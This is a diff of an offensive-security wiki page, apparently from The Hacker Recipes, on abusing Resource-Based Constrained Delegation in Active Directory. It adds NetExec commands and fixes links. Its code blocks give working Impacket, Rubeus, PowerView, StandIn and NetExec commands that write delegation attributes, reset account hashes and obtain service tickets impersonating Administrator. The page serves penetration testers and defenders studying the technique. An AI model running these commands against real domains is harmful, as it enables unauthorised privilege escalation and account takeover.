@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo, sckdev, jamarir
+authors: ShutdownRepo, sckdev, jamarir, azoxlpf
 category: ad
 ---
 
@@ -25,7 +25,7 @@ The common way to conduct these attacks is to create a computer account. This is
 
 Then, in order to abuse this, the attacker has to control the account (A) the target object's (B) attribute has been populated with. Using that account's (A) credentials, the attacker can obtain a ticket through `S4U2Self` and `S4U2Proxy` requests, just like constrained delegation with protocol transition.
 
-In the end, an RBCD abuse results in a Service Ticket to authenticate on the target service (B) on behalf of a user. Once the final Service Ticket is obtained, it can be used with [Pass-the-Ticket](../ptt.md) to access the target service (B). 
+In the end, an RBCD abuse results in a Service Ticket to authenticate on the target service (B) on behalf of a user. Once the final Service Ticket is obtained, it can be used with [Pass-the-Ticket](../pass-the/ptt.md) to access the target service (B). 
 
 > [!WARNING]
 > If the "impersonated" account is "[is sensitive and cannot be delegated](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts)" or a member of the "[Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)" group, the delegation will (probably) fail.
@@ -41,7 +41,7 @@ In the end, an RBCD abuse results in a Service Ticket to authenticate on the tar
 > * As it turns out, even after the patch, as of Jan. 24th 2023, members of the Protected Users group are now in fact protected against delegation, except for the native administrator account (RID 500), even if it's a member of the group. No idea if this is intended or not but it seems it's not the only security behavior of that group that doesn't apply for this account (e.g. RC4 pre-authentication still works for the RID-500 admin, even if member of the Protected Users group, source: [Twitter](https://twitter.com/Defte_/status/1597699988368556032)).
 
 > [!TIP]
-> A technique called [AnySPN or "service class modification"](../ptt.md#modifying-the-spn) can be used concurrently with pass-the-ticket to change the service class the Service Ticket was destined to (e.g. for the `cifs/target.domain.local` SPN, the service class is `cifs`).
+> A technique called [AnySPN or "service class modification"](../pass-the/ptt.md#modifying-the-spn) can be used concurrently with pass-the-ticket to change the service class the Service Ticket was destined to (e.g. for the `cifs/target.domain.local` SPN, the service class is `cifs`).
 
 ![](<assets/RBCD mindmap.png>)
 
@@ -61,10 +61,10 @@ In the end, an RBCD abuse results in a Service Ticket to authenticate on the tar
 
 ```bash
 # Read the attribute
-rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action 'read' 'domain'/'PowerfulUser':'Password'
+rbcd.py -delegate-to "$TARGET$" -dc-ip "$DC_HOST" -action 'read' "$DOMAIN/$USER:$PASSWORD"
 
 # Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
-rbcd.py -delegate-from 'controlledaccount' -delegate-to 'target$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'
+rbcd.py -delegate-from "$CONTROLLED_ACCOUNT" -delegate-to "$TARGET$" -dc-ip "$DC_HOST" -action 'write' "$DOMAIN/$USER:$PASSWORD"
 ```
 
 
@@ -81,7 +81,7 @@ Once the attribute has been modified, the [Impacket](https://github.com/SecureAu
 
 
 ```bash
-getST.py -spn 'cifs/target' -impersonate Administrator -dc-ip 'DomainController' 'domain/controlledaccountwithSPN:SomePassword'
+getST.py -spn 'cifs/target' -impersonate "Administrator" -dc-ip "$DC_IP" "$DOMAIN"/"$ACCOUNT_WITH_SPN":"$PASSWORD"
 ```
 
 
@@ -89,12 +89,12 @@ getST.py -spn 'cifs/target' -impersonate Administrator -dc-ip 'DomainController'
 > In [some cases](./#theory), the delegation will not work. Depending on the context, the [bronze bit ](bronze-bit.md)vulnerability (CVE-2020-17049) can be used with the `-force-forwardable` option to try to bypass restrictions.
 
 > [!TIP]
-> The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)). There however scenarios where the SPN can be changed ([AnySPN](../ptt.md#modifying-the-spn)) to access more service. This technique is automatically tried by Impacket scripts when doing pass-the-ticket.
+> The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)). There however scenarios where the SPN can be changed ([AnySPN](../pass-the/ptt.md#modifying-the-spn)) to access more service. This technique is automatically tried by Impacket scripts when doing pass-the-ticket.
 
 ---
 **Step 3**: Pass-the-ticket :passport_control: 
 
-Once the ticket is obtained, it can be used with [pass-the-ticket](../ptt.md).
+Once the ticket is obtained, it can be used with [pass-the-ticket](../pass-the/ptt.md).
 
 
 === Windows
@@ -110,14 +110,14 @@ The [PowerShell ActiveDirectory module](https://docs.microsoft.com/en-us/powersh
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
 
 # Populate the msDS-AllowedToActOnBehalfOfOtherIdentity
-Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'controlledaccountwithSPN'
+Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $CONTROLLED_USER
 ```
 
 PowerSploit's [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module is an alternative that can be used to edit the attribute ([source](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/)).
 
 ```bash
 # Obtain the SID of the controlled account with SPN (e.g. Computer account)
-$ComputerSid = Get-DomainComputer "controlledaccountwithSPN" -Properties objectsid | Select -Expand objectsid
+$ComputerSid = Get-DomainComputer $CONTROLLED_USER -Properties objectsid | Select -Expand objectsid
 
 # Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
@@ -132,10 +132,10 @@ FuzzSecurity's [StandIn](https://github.com/FuzzySecurity/StandIn) project is an
 
 ```powershell
 # Obtain the SID of the controlled account with SPN (e.g. Computer account)
-StandIn.exe --object samaccountname=controlledaccountwithSPNName
+StandIn.exe --object samaccountname=$CONTROLLED_USER
 
 # Add the object to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer
-StandIn.exe --computer "target" --sid "controlledaccountwithSPN's SID"
+StandIn.exe --computer "target" --sid $CONTROLLED_USER_SID
 ```
 
 The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert).
@@ -162,31 +162,31 @@ Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploi
 # Request a TGT for the current user
 Rubeus.exe tgtdeleg /nowrap
 # OR - Request a TGT for a specific account
-Rubeus.exe asktgt /user:"controlledaccountwithSPN" /aes256:$aesKey /nowrap
+Rubeus.exe asktgt /user:$CONTROLLED_USER /aes256:$aesKey /nowrap
 
 # Request the "impersonation" service ticket using RC4 Key
-Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"cifs/target" /domain:"domain" /user:"controlledaccountwithSPN" /rc4:$NThash
-# OR - Request the "impersonation" service ticket using TGT Ticket of the controlledaccountwithSPN
-Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"host/target" /altservice:cifs,ldap /domain:"domain" /user:"controlledaccountwithSPN" /ticket:$kirbiB64tgt
+Rubeus.exe s4u /nowrap /impersonateuser:$TARGET_USER /msdsspn:"cifs/target" /domain:"$DOMAIN" /user:$CONTROLLED_USER /rc4:$NThash
+# OR - Request the "impersonation" service ticket using TGT Ticket of the controlled account
+Rubeus.exe s4u /nowrap /impersonateuser:$TARGET_USER /msdsspn:"host/target" /altservice:cifs,ldap /domain:"$DOMAIN" /user:$CONTROLLED_USER /ticket:$kirbiB64tgt
 ```
 
 The NT hash and AES keys can be computed as follows.
 
 ```powershell
-Rubeus.exe hash /password:$password
-Rubeus.exe hash /user:$username /domain:"domain.local" /password:$password
+Rubeus.exe hash /password:$PASSWORD
+Rubeus.exe hash /user:$USER /domain:"$DOMAIN" /password:$PASSWORD
 ```
 
 > [!CAUTION]
 > In [some cases](./#theory), the delegation will not work. Depending on the context, the [bronze bit ](bronze-bit.md)vulnerability (CVE-2020-17049) can be used with the `/bronzebit` flag to try to bypass restrictions.
 
 > [!TIP]
-> The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)). There however scenarios where the SPN can be changed ([AnySPN](../ptt.md#modifying-the-spn)) to access more services. This technique can be exploited with the `/altservice` flag with Rubeus.
+> The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)). There however scenarios where the SPN can be changed ([AnySPN](../pass-the/ptt.md#modifying-the-spn)) to access more services. This technique can be exploited with the `/altservice` flag with Rubeus.
 
 ---
 **Step 3**: Pass-the-ticket :passport_control: 
 
-Once the ticket is injected, it can natively be used when accessing the service (see [pass-the-ticket](../ptt.md)).
+Once the ticket is injected, it can natively be used when accessing the service (see [pass-the-ticket](../pass-the/ptt.md)).
 
 :::
 
@@ -200,7 +200,7 @@ The technique is as follows:
 1. Obtain a TGT for the SPN-less user allowed to delegate to a target and retrieve the TGT session key.
 2. Change the user's password hash and set it to the TGT session key.
 3. [Combine S4U2self and U2U](../#s4u2self-+-u2u) so that the SPN-less user can obtain a service ticket to itself, on behalf of another (powerful) user, and then proceed to S4U2proxy to obtain a service ticket to the target the user can delegate to, on behalf of the other, more powerful, user.
-4. [Pass the ticket](../ptt.md) and access the target, as the delegated other
+4. [Pass the ticket](../pass-the/ptt.md) and access the target, as the delegated other
 
 > [!NOTE]
 > While this technique allows for an abuse of the RBCD primitive, even when the [`MachineAccountQuota`](../../builtins/machineaccountquota.md) is set to 0, or when the absence of LDAPS limits the creation of computer accounts, it requires a sacrificial user account. In the abuse process, the user account's password hash will be reset with another hash that has no known plaintext, effectively preventing regular users from using this account.
@@ -209,28 +209,41 @@ The technique is as follows:
 
 === UNIX-like
 
-From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket) (Python) scripts can be used to operate that technique. At the time of writing, September 7th 2022, some of the tools used below are in Pull Requests still being reviewed before merge ([#1201](https://github.com/SecureAuthCorp/impacket/pull/1201) and [#1202](https://github.com/SecureAuthCorp/impacket/pull/1202)).
+From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket) (Python) scripts can be used to operate that technique.
 
 
 ```bash
 # Obtain a TGT through overpass-the-hash to use RC4
-getTGT.py -hashes :$(pypykatz crypto nt 'SomePassword') 'domain'/'controlledaccountwithoutSPN'
+getTGT.py -hashes :$(pypykatz crypto nt "$PASSWORD") "$DOMAIN/$USER"
 
 # Obtain the TGT session key
-describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'
+describeTicket.py "$USER.ccache" | grep 'Ticket Session Key'
 
 # Change the controlledaccountwithoutSPN's NT hash with the TGT session key
-changepasswd.py -newhashes :TGTSessionKey 'domain'/'controlledaccountwithoutSPN':'SomePassword'@'DomainController'
+changepasswd.py -newhashes :TGTSessionKey "$DOMAIN/$USER:$PASSWORD"@"$DC_HOST"
 
 # Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)
-KRB5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass 'domain'/'controlledaccountwithoutSPN'
+KRB5CCNAME="$USER.ccache" getST.py -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass "$DOMAIN/$USER"
 
 # The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)
-changepasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
+changepasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash "$DOMAIN/$USER"@"$DC_HOST"
 ```
 
+This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).
 
-After these steps, the final service ticket can be used with [Pass-the-ticket](../ptt.md).
+```bash
+# Obtain a TGT for the SPN-less user and retrieve the session key
+nxc smb "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --generate-tgt "$USER"
+describeTicket.py "$USER.ccache"
+
+# Set the account's NT hash to the RC4 session key value from describeTicket.py
+nxc smb "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M change-password -o NEWNTHASH='<rc4_session_key>'
+
+# Obtain the delegated service ticket through S4U2Self+U2U, followed by S4U2Proxy
+KRB5CCNAME="$USER.ccache" nxc smb "$DC_IP" --use-kcache --delegate Administrator --u2u
+```
+
+After these steps, the final service ticket can be used with [Pass-the-ticket](../pass-the/ptt.md).
 
 
 === Windows
@@ -239,7 +252,7 @@ From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be 
 
 The steps detailed in [PR #137](https://github.com/GhostPack/Rubeus/pull/137) can be followed.
 
-After these steps, the final service ticket can be used with [Pass-the-ticket](../ptt.md).
+After these steps, the final service ticket can be used with [Pass-the-ticket](../pass-the/ptt.md).
 
 :::
 
@@ -257,3 +270,5 @@ After these steps, the final service ticket can be used with [Pass-the-ticket](.
 [https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
 
 [https://tttang.com/archive/1617/](https://tttang.com/archive/1617/)
+
+[https://www.netexec.wiki/smb-protocol/authentication/delegation](https://www.netexec.wiki/smb-protocol/authentication/delegation)
